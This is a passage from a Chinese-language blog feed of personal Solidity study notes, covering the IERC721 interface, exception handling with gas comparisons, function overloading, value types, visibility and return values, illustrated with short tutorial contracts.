uint256 indexed tokenId);<br>    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);<br>    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);<br>    <br>    function balanceOf(address owner) external view returns (uint256 balance);<br><br>    function ownerOf(uint256 tokenId) external view returns (address owner);<br><br>    function safeTransferFrom(address from, address to, uint256 tokenId) external;<br><br>    function transferFrom(address from, address to, uint256 tokenId) external;<br><br>    function approve(address to, uint256 tokenId) external;<br><br>    function getApproved(uint256 tokenId) external view returns (address operator);<br><br>    function setApprovalForAll(address operator, bool _approved) external;<br><br>    function isApprovedForAll(address owner, address operator) external view returns (bool);<br><br>    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external;<br>&#125;<br><br>contract interactBAYC &#123;<br>    // 利用BAYC地址创建接口合约变量（ETH主网）--这里可以看作BAYC是IERC721的实力化对象<br>    IERC721 BAYC = IERC721(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);<br><br>    // 通过接口调用BAYC的balanceOf()查询持仓量<br>    function balanceOfBAYC(address owner) external view returns (uint256 balance)&#123;<br>        // 当输入BAYC.的时候就会出来很多方法提示，因为BAYC已经具备了IERC721的功能<br>        return BAYC.balanceOf(owner);<br>        <br>    &#125;<br><br>    // 通过接口调用BAYC的safeTransferFrom()安全转账<br>    function safeTransferFromBAYC(address from, address to, uint256 tokenId) external&#123;<br>        BAYC.safeTransferFrom(from, to, tokenId);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IERC721事件"><a href="#IERC721事件" class="headerlink" title="IERC721事件"></a>IERC721事件</h3><p><code>IERC721</code>包含3个事件，其中<code>Transfer</code>和<code>Approval</code>事件在<code>ERC20</code>中也有。</p><ul><li><code>Transfer</code>事件：在转账时被释放，记录代币的发出地址<code>from</code>，接收地址<code>to</code>和<code>tokenId</code>。</li><li><code>Approval</code>事件：在授权时被释放，记录授权地址<code>owner</code>，被授权地址<code>approved</code>和<code>tokenId</code>。</li><li><code>ApprovalForAll</code>事件：在批量授权时被释放，记录批量授权的发出地址<code>owner</code>，被授权地址<code>operator</code>和授权与否的<code>approved</code>。</li></ul><h3 id="IERC721函数"><a href="#IERC721函数" class="headerlink" title="IERC721函数"></a>IERC721函数</h3><ul><li><code>balanceOf</code>：返回某地址的NFT持有量<code>balance</code>。</li><li><code>ownerOf</code>：返回某<code>tokenId</code>的主人<code>owner</code>。</li><li><code>transferFrom</code>：普通转账，参数为转出地址<code>from</code>，接收地址<code>to</code>和<code>tokenId</code>。</li><li><code>safeTransferFrom</code>：安全转账（如果接收方是合约地址，会要求实现<code>ERC721Receiver</code>接口）。参数为转出地址<code>from</code>，接收地址<code>to</code>和<code>tokenId</code>。</li><li><code>approve</code>：授权另一个地址使用你的NFT。参数为被授权地址<code>approve</code>和<code>tokenId</code>。</li><li><code>getApproved</code>：查询<code>tokenId</code>被批准给了哪个地址。</li><li><code>setApprovalForAll</code>：将自己持有的该系列NFT批量授权给某个地址<code>operator</code>。</li><li><code>isApprovedForAll</code>：查询某地址的NFT是否批量授权给了另一个<code>operator</code>地址。</li><li><code>safeTransferFrom</code>：安全转账的重载函数，参数里面包含了<code>data</code>。</li></ul><h2 id="接口在什么时候使用呢？"><a href="#接口在什么时候使用呢？" class="headerlink" title="接口在什么时候使用呢？"></a>接口在什么时候使用呢？</h2><p>如果我们知道一个合约实现了<code>IERC721</code>接口，我们不需要知道它具体代码实现，就可以与它交互。</p><p>无聊猿<code>BAYC</code>属于<code>ERC721</code>代币，实现了<code>IERC721</code>接口的功能。我们不需要知道它的源代码，只需知道它的合约地址，用<code>IERC721</code>接口就可以与它交互，比如用<code>balanceOf()</code>来查询某个地址的<code>BAYC</code>余额，用<code>safeTransferFrom()</code>来转账<code>BAYC</code>。像是一种继承啊</p><h1 id="15-异常"><a href="#15-异常" class="headerlink" title="15 异常"></a>15 异常</h1><p><code>Solidity</code>三种抛出异常的方法：<code>error</code>，<code>require</code>和<code>assert</code>，并比较三种方法的<code>gas</code>消耗</p><h2 id="error"><a href="#error" class="headerlink" title="error"></a>error</h2><p><code>error</code>是0.8.4版本新加的内容，</p><ul><li><p>功能：自定义错误，可以方便且高效(省gas)的向用户解释操作失败的原因</p></li><li><p>优点：同时还可以抛出携带的参数，帮助更好的调试，可以在contract之外定义异常，</p></li><li><p>注意：在执行当中，<code>error</code>必须搭配<code>revert</code>（回退）命令使用。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 自定义一个error <br>// error TransferNotOwner(); //自定义error<br>error TransferNotOwner(address sender); //自定义error<br>// <br>contract Errors &#123;<br>    mapping (uint256=&gt;address) private _owners;<br>    // 第一种，使用自定义错误<br>    function transferOwner1(uint256 tokenId,address newOwner)public  &#123;<br>        // 如果_owners 的tokenid对应的地址与msg就是调用者的地址不等的话就抛出一个自定义错误<br>        if(_owners[tokenId]!=msg.sender)&#123;<br>            revert TransferNotOwner(msg.sender); // <br>        // transact to Errors.transferOwner1 errored: Error occurred: revert.<br><br>        // revert<br>        // The transaction has been reverted to the initial state.<br>        // Error provided by the contract:<br>        // TransferNotOwner // 注意这里，这里显示了我们自定义的error-&gt;TransferNotOwner<br>        // Parameters:<br>        // &#123;<br>        //  &quot;sender&quot;: &#123;<br>        //   &quot;value&quot;: &quot;0x5B38Da6a701c568545dCfcB03FcB875f56beddC4&quot;<br>        //  &#125;<br>        // &#125;<br>        // If the transaction failed for not having enough gas, try increasing the gas limit gently.<br>     &#125;<br>        _owners[tokenId]=newOwner;<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="Require"><a href="#Require" class="headerlink" title="Require"></a>Require</h3><p><code>require</code>命令是<code>solidity 0.8版本</code>之前抛出异常的常用方法，目前很多主流合约仍然还在使用它。它很好用，</p><ul><li><p>缺点：就是<code>gas</code>随着描述异常的字符串长度增加，比<code>error</code>命令要高。</p></li><li><p>使用方法：<code>require(检查条件，&quot;异常的描述&quot;)</code>，当检查条件不成立的时候，就会抛出异常。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// <br>function transferOwner2(uint256 tokenId, address newOwner) public &#123;<br>    // 使用方法：require(检查条件，“异常的描述”);<br>    require(_owners[tokenId]==msg.sender,&quot; Trabsfer Not Owner&quot;);<br>    // transact to Errors.transferOwner2 errored: Error occurred: revert.<br><br>    // revert<br>    // The transaction has been reverted to the initial state.<br>    // Reason provided by the contract: &quot; Trabsfer Not Owner&quot;. //注意这里，这里显示了定义的异常描述<br>   _owners[tokenId]=newOwner;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Assert"><a href="#Assert" class="headerlink" title="Assert"></a>Assert</h3><blockquote><p>其实就是断言用的，</p></blockquote><ul><li>功能：<code>assert</code>命令一般用于程序员写程序<code>debug</code>，</li><li>缺点：因为它不能解释抛出异常的原因（比<code>require</code>少个字符串）。</li><li>它的用法很简单，<code>assert(检查条件）</code>，当检查条件不成立的时候，就会抛出异常。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transferOwner3(uint256 tokenId,address newOwner) public &#123;<br>    assert(_owners[tokenId]==msg.sender); <br>    // revert 注意这里：只抛出了异常<br>    //     The transaction has been reverted to the initial state.<br>    // Note: The called function should be payable if you send value and the value you send should be less than your current balance.<br>    // If the transaction failed for not having enough gas, try increasing the gas limit gently.<br>   _owners[tokenId]=newOwner;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三种方法的gas比较"><a href="#三种方法的gas比较" class="headerlink" title="三种方法的gas比较"></a>三种方法的gas比较</h2><p>我们比较一下三种抛出异常的<code>gas</code>消耗，通过remix控制台的Debug按钮，能查到每次函数调用的<code>gas</code>消耗分别如下： （使用0.8.17版本编译）</p><ol><li><strong><code>error</code>方法<code>gas</code>消耗</strong>：24457 (<strong>加入参数后<code>gas</code>消耗</strong>：24660)</li><li><strong><code>require</code>方法<code>gas</code>消耗</strong>：24755</li><li><strong><code>assert</code>方法<code>gas</code>消耗</strong>：24473</li></ol><p>我们可以看到，<code>error</code>方法<code>gas</code>最少，其次是<code>assert</code>，<code>require</code>方法消耗<code>gas</code>最多！因此，<code>error</code>既可以告知用户抛出异常的原因，又能省<code>gas</code>，大家要多用！（注意，由于部署测试时间的不同，每个函数的<code>gas</code>消耗会有所不同，但是比较结果会是一致的。）</p><p><strong>备注:</strong> Solidity 0.8.0之前的版本，<code>assert</code>抛出的是一个 <code>panic exception</code>，会把剩余的 <code>gas</code> 全部消耗，不会返还。更多细节见<a href="https://docs.soliditylang.org/en/v0.8.17/control-structures.html">官方文档</a>。</p><h1 id="16-函数重载【用的很少的】"><a href="#16-函数重载【用的很少的】" class="headerlink" title="16. 函数重载【用的很少的】"></a>16. 函数重载【用的很少的】</h1><p><code>Solidity</code>中允许函数进行重载（<code>overloading</code>），即名字相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。注意，<code>Solidity</code>不允许修饰器（<code>modifier</code>）重载。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function saySomething() public pure returns(string memory)&#123;<br>    return(&quot;Nothing&quot;);<br>&#125;<br><br>function saySomething(string memory something) public pure returns(string memory)&#123;<br>    // 函数重载，重载就是重写这个同名函数<br>    return(something);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="实参匹配（Argument-Matching）"><a href="#实参匹配（Argument-Matching）" class="headerlink" title="实参匹配（Argument Matching）"></a>实参匹配（Argument Matching）</h3><p>在调用重载函数时，会把输入的实际参数和函数参数的变量类型做匹配。 如果出现多个匹配的重载函数，则会报错。下面这个例子有两个叫<code>f()</code>的函数，一个参数为<code>uint8</code>，另一个为<code>uint256</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function f(uint8 _in) public pure returns (uint8 out) &#123;<br>    out = _in;<br>&#125;<br><br>function f(uint256 _in) public pure returns (uint256 out) &#123;<br>    out = _in;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们调用<code>f(50)</code>，因为<code>50</code>既可以被转换为<code>uint8</code>，也可以被转换为<code>uint256</code>，因此会报错。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Solidity笔记之一基础变量</title>
    <link href="/2025/04/22/08-1Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B/"/>
    <url>/2025/04/22/08-1Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="先看总结"><a href="#先看总结" class="headerlink" title="先看总结"></a>先看总结</h1><h1 id="Solidity中的变量类型"><a href="#Solidity中的变量类型" class="headerlink" title="Solidity中的变量类型"></a>Solidity中的变量类型</h1><ol><li>**值类型(Value Type)**：包括布尔型，整数型等等，这类变量赋值时候直接传递数值。</li><li>**引用类型(Reference Type)**：包括数组和结构体，这类变量占空间大，赋值时候直接传递地址（类似指针）。</li><li><strong>映射类型(Mapping Type)</strong>: Solidity中存储键值对的数据结构，可以理解为哈希表</li></ol><p>我们将仅介绍常用类型，不常用的类型不会涉及，本篇将介绍值类型。</p><h1 id="2-值类型"><a href="#2-值类型" class="headerlink" title="2. 值类型"></a>2. 值类型</h1><h3 id="1-布尔型"><a href="#1-布尔型" class="headerlink" title="1. 布尔型"></a>1. 布尔型</h3><p>布尔型是二值变量，取值为 <code>true</code> 或 <code>false</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 布尔值<br>bool public _bool = true; <br>//类型 公有 值名称=值<br></code></pre></td></tr></table></figure><p>布尔值的运算符包括：</p><ul><li><code>!</code> （逻辑非）</li><li><code>&amp;&amp;</code> （逻辑与，”and”）</li><li><code>||</code> （逻辑或，”or”）</li><li><code>==</code> （等于）</li><li><code>!=</code> （不等于）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 布尔运算<br>bool public _bool1 = !_bool; // 取非<br>bool public _bool2 = _bool &amp;&amp; _bool1; // 与<br>bool public _bool3 = _bool || _bool1; // 或<br>bool public _bool4 = _bool == _bool1; // 相等<br>bool public _bool5 = _bool != _bool1; // 不相等<br></code></pre></td></tr></table></figure><p>在上述代码中：变量 <code>_bool</code> 的取值是 <code>true</code>；<code>_bool1</code> 是 <code>_bool</code> 的非，为 <code>false</code>；<code>_bool &amp;&amp; _bool1</code> 为 <code>false</code>；<code>_bool || _bool1</code> 为 <code>true</code>；<code>_bool == _bool1</code> 为 <code>false</code>；<code>_bool != _bool1</code> 为 <code>true</code>。</p><p><strong>值得注意的是：</strong><code>&amp;&amp;</code> 和 <code>||</code> 运算符遵循短路规则，这意味着，假如存在 <code>f(x) || g(y)</code> 的表达式，如果 <code>f(x)</code> 是 <code>true</code>，<code>g(y)</code> 不会被计算，即使它和 <code>f(x)</code> 的结果是相反的。假如存在<code>f(x) &amp;&amp; g(y)</code> 的表达式，如果 <code>f(x)</code> 是 <code>false</code>，<code>g(y)</code> 不会被计算。 所谓“短路规则”，一般出现在逻辑与（&amp;&amp;）和逻辑或（||）中。 当逻辑与（&amp;&amp;）的第一个条件为false时，就不会再去判断第二个条件； 当逻辑或（||）的第一个条件为true时，就不会再去判断第二个条件，这就是短路规则。</p><h3 id="2-整型"><a href="#2-整型" class="headerlink" title="2. 整型"></a>2. 整型</h3><p>整型是 Solidity 中的整数，最常用的包括：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 整型<br>int public _int = -1; // 整数，包括负数<br>uint public _uint = 1; // 无符号整数<br>uint256 public _number = 20220330; // 256位无符号整数<br></code></pre></td></tr></table></figure><p>常用的整型运算符包括：</p><ul><li>比较运算符（返回布尔值）： <code>&lt;=</code>， <code>&lt;</code>，<code>==</code>， <code>!=</code>， <code>&gt;=</code>， <code>&gt;</code></li><li>算术运算符： <code>+</code>， <code>-</code>， <code>*</code>， <code>/</code>， <code>%</code>（取余），<code>**</code>（幂）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 整数运算<br>uint256 public _number1 = _number + 1; // +，-，*，/<br>uint256 public _number2 = 2**2; // 指数<br>uint256 public _number3 = 7 % 2; // 取余数<br>bool public _numberbool = _number2 &gt; _number3; // 比大小<br></code></pre></td></tr></table></figure><p>大家可以运行一下代码，看看这 4 个变量分别是多少。</p><h3 id="3-地址类型"><a href="#3-地址类型" class="headerlink" title="3. 地址类型"></a>3. 地址类型</h3><p>地址类型有两类：</p><ul><li>普通地址: 存储一个 20 字节的值（以太坊地址的大小）。</li><li>Payable address ：比普通地址多了<code>transfer</code>和<code>send</code>两个成员方法，用于接收转账。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 地址<br>address public _address = 0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71;<br>address payable public _address1 = payable(_address); // payable address，可以转账、查余额<br>// 地址类型的成员<br>uint256 public balance = _address1.balance; // balance of address<br></code></pre></td></tr></table></figure><h3 id="4-定长字节数组"><a href="#4-定长字节数组" class="headerlink" title="4. 定长字节数组"></a>4. 定长字节数组</h3><p>字节数组氛围定长和不定长两种</p><ul><li>定长字节数组：属于值类型，数组长度在声明之后不能改变。根据字节数组的长度分为 <code>bytes1</code>, <code>bytes8</code>, <code>bytes32</code> 等类型。定长字节数组最多存储 32 bytes 数据，即<code>bytes32</code>。</li><li><strong>不定长字节数组</strong>: 属于引用类型（之后的章节介绍），数组长度在声明之后可以改变，包括 <code>bytes</code> 等。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 固定长度的字节数组<br>bytes32 public _byte32 = &quot;MiniSolidity&quot;; // 字节形式<br>bytes1 public _byte = _byte32[0]; // 取其第一个字节<br></code></pre></td></tr></table></figure><p>在上述代码中，字符串 <code>MiniSolidity</code> 以字节的方式存储进变量 <code>_byte32</code>。如果把它转换成 <code>16 进制</code>，就是：<code>0x4d696e69536f6c69646974790000000000000000000000000000000000000000</code></p><p><code>_byte</code> 变量的值为 <code>_byte32</code> 的第一个字节，即 <code>0x4d</code>。</p><h3 id="5-枚举-enum"><a href="#5-枚举-enum" class="headerlink" title="5. 枚举 enum"></a>5. 枚举 enum</h3><p>枚举（<code>enum</code>）是 Solidity 中用户定义的数据类型。它主要用于为 <code>uint</code> 分配名称，使程序易于阅读和维护。它与 <code>C 语言</code> 中的 <code>enum</code> 类似，使用名称来代替从 <code>0</code> 开始的 <code>uint</code>：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs fortran">// 用<span class="hljs-keyword">enum</span>将uint <span class="hljs-number">0</span>， <span class="hljs-number">1</span>， <span class="hljs-number">2</span>表示为Buy, Hold, Sell<br><span class="hljs-keyword">enum</span> ActionSet &#123; Buy, Hold, Sell &#125;<br>// 创建<span class="hljs-keyword">enum</span>变量 <span class="hljs-keyword">action</span><br>ActionSet <span class="hljs-keyword">action</span> = ActionSet.Buy;<br></code></pre></td></tr></table></figure><p>枚举可以显式地和 <code>uint</code> 相互转换，并会检查转换的无符号整数是否在枚举的长度内，否则会报错：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">// enum可以和uint显式的转换</span><br>function <span class="hljs-built_in">enumToUint</span>() external view <span class="hljs-built_in">returns</span>(uint)&#123;<br>    return <span class="hljs-built_in">uint</span>(action);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>enum</code> 是一个比较冷门的数据类型，几乎没什么人用。</strong></p><h1 id="3-函数"><a href="#3-函数" class="headerlink" title="3. 函数"></a>3. 函数</h1><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>我们先看一下 Solidity 中函数的形式:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function &lt;function name&gt;([parameter types[, ...]]) &#123;internal|external|public|private&#125; [pure|view|payable] [virtual|override] [&lt;modifiers&gt;]<br>[returns (&lt;return types&gt;)]&#123; &lt;function body&gt; &#125;<br></code></pre></td></tr></table></figure><p>看着有一些复杂，让我们从前往后逐个解释(方括号中的是可写可不 写的关键字)：</p><ol><li><p><code>function</code>：声明函数时的固定用法。要编写函数，就需要以 <code>function</code> 关键字开头。</p></li><li><p><code>&lt;function name&gt;</code>：函数名。</p></li><li><p><code>([parameter types[, ...]])</code>：圆括号内写入函数的参数，即输入到函数的变量类型和名称。</p></li><li><p><code>&#123;internal|external|public|private&#125;</code>：函数可见性说明符，共有4种。</p><ul><li><code>public</code>：内部和外部均可见。</li><li><code>private</code>：只能从本合约内部访问，继承的合约也不能使用。</li><li><code>external</code>：只能从合约外部访问（但内部可以通过 <code>this.f()</code> 来调用，<code>f</code>是函数名）。</li><li><code>internal</code>: 只能从合约内部访问，继承的合约可以用。</li></ul><p><strong>注意 1</strong>：合约中定义的函数需要明确指定可见性，它们没有默认值。</p><p><strong>注意 2</strong>：<code>public|private|internal</code> 也可用于修饰状态变量(定义可参考<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/03_Function/[../05_DataStorage/readme.md#1-%E7%8A%B6%E6%80%81%E5%8F%98%E9%87%8F](https:/github.com/AmazingAng/WTF-Solidity/tree/main/05_DataStorage#1-%E7%8A%B6%E6%80%81%E5%8F%98%E9%87%8F)">WTF Solidity 第5讲的相关内容</a>)。<code>public</code>变量会自动生成同名的<code>getter</code>函数，用于查询数值。未标明可见性类型的状态变量，默认为<code>internal</code>。</p></li><li><p><code>[pure|view|payable]</code>：决定函数权限&#x2F;功能的关键字。<code>payable</code>（可支付的）很好理解，带着它的函数，运行的时候可以给合约转入 ETH。<code>pure</code> 和 <code>view</code> 的介绍见下一节。</p></li><li><p><code>[virtual|override]</code>: 方法是否可以被重写，或者是否是重写方法。<code>virtual</code>用在父合约上，标识的方法可以被子合约重写。<code>override</code>用在子合约上，表名方法重写了父合约的方法。</p></li><li><p><code>&lt;modifiers&gt;</code>: 自定义的修饰器，可以有0个或多个修饰器。</p></li><li><p><code>[returns ()]</code>：函数返回的变量类型和名称。</p></li><li><p><code>&lt;function body&gt;</code>: 函数体。</p></li></ol><h2 id="Solidity-函数可见性关键字"><a href="#Solidity-函数可见性关键字" class="headerlink" title="Solidity 函数可见性关键字"></a>Solidity 函数可见性关键字</h2><table><thead><tr><th>关键字</th><th>说明</th><th>谁能调用</th><th>访问方式示例</th></tr></thead><tbody><tr><td><code>public</code></td><td>函数对所有人可见，既可以内部调用，也可以外部调用</td><td>合约内部、派生合约、合约外部</td><td>直接调用、合约外部调用</td></tr><tr><td><code>external</code></td><td>函数只能被合约外部调用，不能用 <code>this.xxx()</code> 形式内部调用（但可以通过低级调用调用）</td><td>合约外部调用</td><td>合约外部调用，不能内部普通调用</td></tr><tr><td><code>internal</code></td><td>函数只能在合约内部或派生合约中调用</td><td>合约内部、派生合约</td><td>内部调用、继承合约调用</td></tr><tr><td><code>private</code></td><td>函数只能在定义它的合约内部调用，派生合约也不能访问</td><td>仅合约内部</td><td>仅合约内部调用</td></tr></tbody></table><hr><h2 id="详细说明"><a href="#详细说明" class="headerlink" title="详细说明"></a>详细说明</h2><h2 id="到底什么是-Pure-和View？"><a href="#到底什么是-Pure-和View？" class="headerlink" title="到底什么是 Pure 和View？"></a>到底什么是 <code>Pure</code> 和<code>View</code>？</h2><p>刚开始学习 <code>solidity</code> 时，<code>pure</code> 和 <code>view</code> 关键字可能令人费解，因为其他编程语言中没有类似的关键字。<code>solidity</code> 引入这两个关键字主要是因为 以太坊交易需要支付气费（gas fee）。合约的状态变量存储在链上，gas fee 很贵，如果计算不改变链上状态，就可以不用付 <code>gas</code>。包含 <code>pure</code> 和 <code>view</code> 关键字的函数是不改写链上状态的，因此用户直接调用它们是不需要付 gas 的（注意，合约中非 <code>pure</code>&#x2F;<code>view</code> 函数调用 <code>pure</code>&#x2F;<code>view</code> 函数时需要付gas）。</p><p>在以太坊中，以下语句被视为修改链上状态：</p><ol><li>写入状态变量。</li><li>释放事件。</li><li>创建其他合约。</li><li>使用 <code>selfdestruct</code>.</li><li>通过调用发送以太币。</li><li>调用任何未标记 <code>view</code> 或 <code>pure</code> 的函数。</li><li>使用低级调用（low-level calls）。</li><li>使用包含某些操作码的内联汇编。</li></ol><ul><li><code>pure</code>，中文意思是“纯”，这里可以理解为”纯打酱油的”。<code>pure</code> 函数既不能读取也不能写入链上的状态变量。就像小怪一样，看不到也摸不到碧琪公主。</li><li><code>view</code>，“看”，这里可以理解为“看客”。<code>view</code>函数能读取但也不能写入状态变量。类似马里奥，能看到碧琪公主，但终究是看客，不能入洞房。</li><li>非 <code>pure</code> 或 <code>view</code> 的函数既可以读取也可以写入状态变量。类似马里奥里的 <code>boss</code>，可以对碧琪公主为所欲为🐶。</li></ul><h1 id="4-函数输出"><a href="#4-函数输出" class="headerlink" title="4. 函数输出"></a>4. 函数输出</h1><h2 id="返回值：return-和-returns"><a href="#返回值：return-和-returns" class="headerlink" title="返回值：return 和 returns"></a>返回值：return 和 returns</h2><p>在函数定义行中有两个关键字<code>return</code>和<code>returns</code>，他们区别是：</p><ul><li><code>return</code>跟在函数名后面，用于声明返回的变量类型以及变量名称</li><li><code>return</code>:用于函数主题中，返回指定的变量</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 返回多个变量<br>function returnMultiple() public pure returns(uint256, bool, uint256[3] memory)&#123;<br>    return(1, true, [uint256(1),2,5]);<br>&#125;<br></code></pre></td></tr></table></figure><p>在上述代码中，我们利用 <code>returns</code> 关键字声明了有多个返回值的 <code>returnMultiple()</code> 函数，然后我们在函数主体中使用 <code>return(1, true, [uint256(1),2,5])</code> 确定了返回值。</p><p>这里<code>uint256[3]</code>声明了一个长度为<code>3</code>且类型为<code>uint256</code>的数组作为返回值。因为<code>[1,2,3]</code>会默认为<code>uint8(3)</code>，因此<code>[uint256(1),2,5]</code>中首个元素必须强转</p><h2 id="命名式返回"><a href="#命名式返回" class="headerlink" title="命名式返回"></a>命名式返回</h2><p>我们可以在 <code>returns</code> 中标明返回变量的名称。Solidity 会初始化这些变量，并且自动返回这些变量的值，无需使用 <code>return</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 命名式返回<br>function returnNamed() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;<br>    _number = 2;<br>    _bool = false;<br>    _array = [uint256(3),2,1];<br>&#125;<br></code></pre></td></tr></table></figure><p>在上述代码中，我们用 <code>returns(uint256 _number, bool _bool, uint256[3] memory _array)</code> 声明了返回变量类型以及变量名。这样，在主体中只需为变量 <code>_number</code>、<code>_bool</code>和<code>_array</code> 赋值，即可自动返回。</p><p>当然，你也可以在命名式返回中用 <code>return</code> 来返回变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 命名式返回，依然支持return<br>function returnNamed2() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;<br>    return(1, true, [uint256(1),2,5]);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="解构式赋值"><a href="#解构式赋值" class="headerlink" title="解构式赋值"></a>解构式赋值</h2><p>Solidity 支持使用解构式赋值规则来读取函数的全部或部分返回值。</p><ul><li><p>读取所有返回值：声明变量，然后将要赋值的变量用<code>,</code>隔开，按顺序排列。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint256 _number;<br>bool _bool;<br>uint256[3] memory _array;<br>(_number, _bool, _array) = returnNamed();<br></code></pre></td></tr></table></figure></li><li><p>读取部分返回值：声明要读取的返回值对应的变量，不读取的留空。在下面的代码中，我们只读取<code>_bool</code>，而不读取返回的<code>_number</code>和<code>_array</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">(, _bool2, ) = returnNamed();<br></code></pre></td></tr></table></figure></li></ul><p>如果两个币种发生较大汇率的变化就会有损失</p><h1 id="5-变量数据存储和作用域"><a href="#5-变量数据存储和作用域" class="headerlink" title="5. 变量数据存储和作用域"></a>5. 变量数据存储和作用域</h1><p>引用类型(Reference Type) ：包括数组(array)和结构体(struct)，由于这类变量的类型比较复杂且占用空间比较大，所以使用的时候必须要声明数据所存储的位置，</p><h2 id="数据位置"><a href="#数据位置" class="headerlink" 